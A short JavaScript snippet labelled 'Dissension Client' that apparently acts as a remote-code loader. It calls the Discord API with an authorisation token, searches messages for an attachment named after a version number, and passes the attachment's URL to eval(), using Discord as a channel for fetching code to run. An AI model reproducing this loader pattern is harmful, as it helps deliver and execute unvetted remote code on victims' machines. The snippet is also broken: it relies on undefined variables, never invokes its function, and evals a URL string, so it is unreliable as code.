//
//  DISSENSION
//  By UO
//  version: Dissension Client 1
// 

{
	let core_ver = "3"
	(async function(){
		await fetch(`https://discordapp.com/api/v9${p.url}`, {
					method: p.method,
					body: p.body,
					headers: {
						'Authorization': p.token,
						'Content-Type': 'application/json'
					}
		})
		let result
		for (var i = 0; i < messages.length; i++) {
			let message = messages[i];

			if (message.attachments.length <= 0) { continue } // skip iteration if no attachements

			message.attachments.forEach(attachment => {
				if (attachment.filename == core_ver) {
					result = attachment.url
				}
			});
		}
		eval(result)
	})
}